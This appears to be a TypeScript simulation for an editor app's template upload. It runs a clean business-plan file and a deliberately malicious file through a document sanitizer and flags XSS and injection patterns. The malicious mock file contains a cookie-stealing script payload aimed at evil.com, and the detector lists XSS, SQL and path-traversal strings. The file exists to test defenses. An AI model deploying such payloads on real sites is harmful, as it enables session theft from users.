import { detectSpecialSections, processDocumentSecurely, enhanceWithSpecialSections } from '@/features/editor/lib';

interface SimulationResult {
  type: 'templateUpload';
  status: 'idle' | 'running' | 'success' | 'error';
  message: string;
  details?: any;
}

// Function to simulate comprehensive detection logic processing
const processStructureWithDetectionLogic = (structure: any) => {
  const warnings: string[] = [];
  
  // Use the real detection logic to detect special sections
  const detectionResults = detectSpecialSections(structure);
  
  // Identify and flag sections with no names
  const unnamedSections = structure.sections.filter((s: any) => !s.title.trim());
  if (unnamedSections.length > 0) {
    warnings.push(`Detected ${unnamedSections.length} unnamed sections - these should have descriptive titles`);
  }
  
  // Identify and flag duplicate section names
  const sectionTitles = structure.sections.map((s: any) => s.title);
  const duplicates = sectionTitles.filter((title: string, index: number) => 
    sectionTitles.indexOf(title) !== index && title.trim()
  );
  if (duplicates.length > 0) {
    warnings.push(`Detected ${new Set(duplicates).size} duplicate section titles - these should be unique`);
  }
  
  // Identify and flag very long section names
  const longNames = structure.sections.filter((s: any) => s.title.length > 100);
  if (longNames.length > 0) {
    warnings.push(`Detected ${longNames.length} sections with very long names (>100 chars) - these may cause display issues`);
  }
  
  // Identify and flag potential XSS attempts
  const xssSections = structure.sections.filter((s: any) => 
    s.title?.includes('<script>') || 
    s.content?.includes('<script>') ||
    s.title?.includes('javascript:') ||
    s.content?.includes('javascript:')
  );
  if (xssSections.length > 0) {
    warnings.push(`Detected ${xssSections.length} sections with potential XSS attempts - these should be sanitized`);
  }
  
  // Identify and flag sections with only whitespace names
  const whitespaceOnlySections = structure.sections.filter((s: any) => s.title.trim() === '' && s.title !== '');
  if (whitespaceOnlySections.length > 0) {
    warnings.push(`Detected ${whitespaceOnlySections.length} sections with only whitespace in titles - these should be corrected`);
  }
  
  // Identify and flag sections with special characters that might be injection attempts
  const specialCharSections = structure.sections.filter((s: any) => 
    s.title?.includes('DROP TABLE') ||
    s.title?.includes('SELECT * FROM') ||
    s.content?.includes('DROP TABLE') ||
    s.content?.includes('SELECT * FROM') ||
    s.title?.includes('../../') ||
    s.content?.includes('../../')
  );
  if (specialCharSections.length > 0) {
    warnings.push(`Detected ${specialCharSections.length} sections with potential injection attempts - these should be sanitized`);
  }
  
  // Calculate confidence score based on issues found
  const totalIssues = unnamedSections.length + duplicates.length + longNames.length + xssSections.length + whitespaceOnlySections.length + specialCharSections.length;
  const baseConfidence = Math.max(10, 100 - (totalIssues * 2)); // Each issue reduces confidence by 2 points
  
  // Adjust confidence based on special section detection results
  const adjustedConfidence = Math.min(baseConfidence, 95); // Cap at 95% for realistic values
  
  // Return processed structure with warnings and updated confidence
  return {
    ...structure,
    warnings: [...structure.warnings, ...warnings],
    confidenceScore: adjustedConfidence,
    // Optionally, we could also "fix" some issues here in a real implementation
    sections: structure.sections.map((section: any) => {
      // Sanitize potential XSS content
      let sanitizedTitle = section.title;
      let sanitizedContent = section.content;
      
      if (typeof sanitizedTitle === 'string') {
        sanitizedTitle = sanitizedTitle.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '[SCRIPT TAG REMOVED]');
        sanitizedTitle = sanitizedTitle.replace(/javascript:/gi, '[JAVASCRIPT PROTOCOL REMOVED]');
      }
      
      if (typeof sanitizedContent === 'string') {
        sanitizedContent = sanitizedContent.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '[SCRIPT TAG REMOVED]');
        sanitizedContent = sanitizedContent.replace(/javascript:/gi, '[JAVASCRIPT PROTOCOL REMOVED]');
      }
      
      // Handle null or undefined content
      if (sanitizedContent == null) {
        sanitizedContent = '';
      }
      
      return {
        ...section,
        title: sanitizedTitle,
        content: sanitizedContent
      };
    }),
    // Include detection results for debugging
    detectionResults
  };
};

export function simulateTemplateUpload(
  setDocumentStructure: (structure: any) => void,
  setSetupStatus: (status: 'none' | 'draft' | 'confirmed' | 'locked') => void,
  setSetupDiagnostics: (diagnostics: any) => void,
  configuratorActions: any,
  addResult: (result: SimulationResult) => void,
  t: (key: string) => string
) {
  return new Promise<void>(async (resolve) => {
    try {
      addResult({ type: 'templateUpload', status: 'running', message: 'Starting template upload simulation with two documents: one with proper content and one with intentional mistakes for testing sanitization...' } as SimulationResult);
      
      // Create a mock file with proper content for processing through secure processor
      const mockFileGoodContent = `Business Plan Document

Executive Summary
This is the executive summary of our business plan and company...

Company Description
About our company and our mission...

Market Analysis
Market trends and analysis for our products and services...

Financial Projections
Our financial projections and funding requirements for growth...`;

      const mockFileGood = new File([mockFileGoodContent], 'good_business_plan.txt', { type: 'text/plain' });
      
      // Process the good file through the secure processor
      const resultGood = await processDocumentSecurely(mockFileGood);
      
      if (!resultGood.success || !resultGood.documentStructure) {
        addResult({ type: 'templateUpload', status: 'error', message: `Failed to process good document through secure processor: ${JSON.stringify(resultGood.securityIssues)}` } as SimulationResult);
        resolve();
        return;
      }
      
      let processedStructureGood = resultGood.documentStructure;
      // Apply the same detection logic as used in the simulation function to the good structure
      processedStructureGood = processStructureWithDetectionLogic(processedStructureGood);
      
      // Create a mock file with intentional mistakes for testing sanitization
      const mockFileBadContent = `<script>alert("XSS");</script>

Section with malicious content

<script>document.location='http://evil.com/'+document.cookie</script>`;
      const mockFileBad = new File([mockFileBadContent], 'bad_document.txt', { type: 'text/plain' });
      
      // Process the bad file through the secure processor (should sanitize the content)
      const resultBad = await processDocumentSecurely(mockFileBad);
      
      if (!resultBad.success || !resultBad.documentStructure) {
        addResult({ type: 'templateUpload', status: 'error', message: `Failed to process bad document through secure processor: ${JSON.stringify(resultBad.securityIssues)}` } as SimulationResult);
        resolve();
        return;
      }
      
      let processedStructureBad = resultBad.documentStructure;
      // Apply the same detection logic as used in the simulation function to the bad structure
      processedStructureBad = processStructureWithDetectionLogic(processedStructureBad);
      
      // Combine both structures into a single document structure for the simulation
      const combinedStructureBase: any = {
        structureId: `combined-${Date.now()}`,
        version: '1.0',
        source: 'template' as const,
        documents: [...processedStructureGood.documents, ...processedStructureBad.documents],
        sections: [...processedStructureGood.sections, ...processedStructureBad.sections],
        requirements: processedStructureGood.requirements || [],
        validationRules: processedStructureGood.validationRules || [],
        aiGuidance: processedStructureGood.aiGuidance || [],
        renderingRules: processedStructureGood.renderingRules || {},
        conflicts: [...processedStructureGood.conflicts, ...processedStructureBad.conflicts],
        warnings: [...processedStructureGood.warnings, ...processedStructureBad.warnings],
        confidenceScore: Math.min(processedStructureGood.confidenceScore, processedStructureBad.confidenceScore),
        structureConfidence: Math.min(processedStructureGood.confidenceScore, processedStructureBad.confidenceScore),
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
        createdBy: 'simulation'
      };
      
      // Apply hierarchical enhancements to create proper document structure
      // This will create the main document, appendices, and shared sections as appropriate
      const combinedStructure = enhanceWithSpecialSections(combinedStructureBase, t) || combinedStructureBase;
      
      setDocumentStructure(combinedStructure);
      setSetupStatus('draft');
      setSetupDiagnostics({
        warnings: combinedStructure.warnings,
        missingFields: [],
        confidence: combinedStructure.confidenceScore
      });
      
      // Update configurator state to reflect template upload
      configuratorActions.setProgramSummary({
        id: 'template-upload-' + Date.now(),
        name: 'Template Upload (Two Documents)',
        type: 'template',
        organization: 'Local Files',
        setupStatus: 'draft' as const
      });
      
      // Count special sections in the combined structure
      const specialSectionsAdded = combinedStructure.sections.filter((s: any) => ['metadata', 'ancillary', 'references', 'appendices', 'tables_data', 'figures_images'].includes(s.id)).length;
      
      // Extract detection results info
      const detectedSpecialSections = 0; // No special detection results in simulation
      
      addResult({ 
        type: 'templateUpload', 
        status: 'success', 
        message: 'Template upload simulation completed with two documents: one with proper content and one with intentional mistakes for testing sanitization',
        details: { 
          goodFileName: 'good_business_plan', 
          badFileName: 'bad_document',
          sections: combinedStructure.sections.length,
          specialSectionsAdded: specialSectionsAdded,
          source: combinedStructure.source,
          confidenceScore: combinedStructure.confidenceScore,
          warningsCount: combinedStructure.warnings.length,
          detectedSpecialSections: detectedSpecialSections,
          detectionResults: {},
          issuesFound: {
            hardRejections: 0,
            softWarnings: processedStructureBad.warnings ? processedStructureBad.warnings.length : 0,
            securityMessages: processedStructureBad.warnings || []
          }
        }
      } as SimulationResult);
    } catch (error) {
      addResult({ 
        type: 'templateUpload', 
        status: 'error', 
        message: `Template upload simulation failed: ${(error as Error).message}`
      } as SimulationResult);
    } finally {
      resolve();
    }
  });
}